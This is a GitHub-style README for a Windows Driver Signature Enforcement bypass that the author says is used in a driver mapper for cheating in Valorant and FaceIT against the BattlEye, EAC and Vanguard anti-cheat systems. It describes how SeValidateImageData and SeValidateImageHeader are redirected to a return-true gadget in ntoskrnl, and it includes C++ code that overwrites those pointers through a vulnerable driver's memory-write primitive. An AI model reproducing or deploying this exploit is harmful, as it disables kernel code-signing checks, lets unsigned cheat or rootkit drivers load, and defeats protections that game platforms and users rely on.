# Full Project
Full project is here https://github.com/i32-Sudo/PdFwKrnlMapper
# DSEMapper
This is my BE / EAC / VGK DSE Exploit that is used in my Driver Mapper for Valorant &amp; FaceIT (But also works on BE/EAC)

# Concept
My DSE Exploit works by taking the SeValidateImageData & SeValidateImageHeader and setting the EIP/RIP to (any) Return (ret 4) instruction in NTOSKRNL ( B8 01 00 00 00 C3 )
```cpp
	bool DisableDSE()
	{
		ULONG64 ReturnAddressOffset = NtoskrnlBaseAddress + RetOffset;

		BOOL Status = Vuln::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageHeaderOffset, &ReturnAddressOffset, sizeof(ReturnAddressOffset));
		if (!Status)
			return false;

		Status = Vuln::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageDataOffset, &ReturnAddressOffset, sizeof(ReturnAddressOffset));
		if (!Status)
			return false;

		return Status;
	}
```
# Contact
If you want to contact me in regards of my work or projects my discord is -> `_ambitza`, Please do not message me for Issues or Learning/Studying I am not a teacher.
